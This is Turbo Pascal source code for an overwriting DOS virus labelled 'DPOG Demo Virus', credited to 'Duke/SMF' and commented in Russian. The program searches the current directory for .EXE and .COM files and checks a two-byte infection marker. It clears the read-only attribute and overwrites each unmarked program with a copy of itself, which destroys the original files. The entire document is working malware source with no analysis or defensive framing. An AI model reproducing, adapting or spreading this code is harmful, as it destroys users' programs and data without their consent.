{$M 5000, 1000, 5000}
uses dos;
var Author,VirusName,Generator:string;
    Comman:string;                       {строка под COMSPEC}
    ID1,ID2:byte;                        {метка зараженности}
    N:searchrec;
{------------------}
procedure Infect(i:string);              {Заражение файлов}
var st:string;
begin
st:=' '+i+' >nul';
Exec(Comman,'/c attrib -r'+st);
Exec(Comman,'/c copy '+paramstr(0)+st);
end;
{------------------}
procedure Check(i:string);
var g:file;
    y,z:byte;
begin
if i=paramstr(0) then Exit;
if copy(i,length(i)-10,11)='COMMAND.COM' then Exit;
assign(g,i);
reset(g,1);
seek(g,$0A);
blockread(g,y,1);
blockread(g,z,1);
close(g);
if (y<>ord(ID1)) or (z<>ord(ID2)) then Infect(i);
end;
{------------------}
procedure FindFileForKill;
begin
FindFirst('*.exe',$21,N);
while doserror=0 do
  begin
  Check(N.name);
  FindNext(N)
  end;
FindFirst('*.com',$21,N);
while doserror=0 do
  begin
  Check(N.name);
  FindNext(N)
  end;
end;
{------------------}
begin
Author:='Duke/SMF';
VirusName:='DPOG Demo Virus';
Generator:='[DPOG v0.01]';
Comman:=GetEnv('COMSPEC');
ID1:=77;
ID2:=36;
FindFileForKill;
writeln('This is DPOG demo virus');
writeln('Created (c) by Duke/SMF');
end.
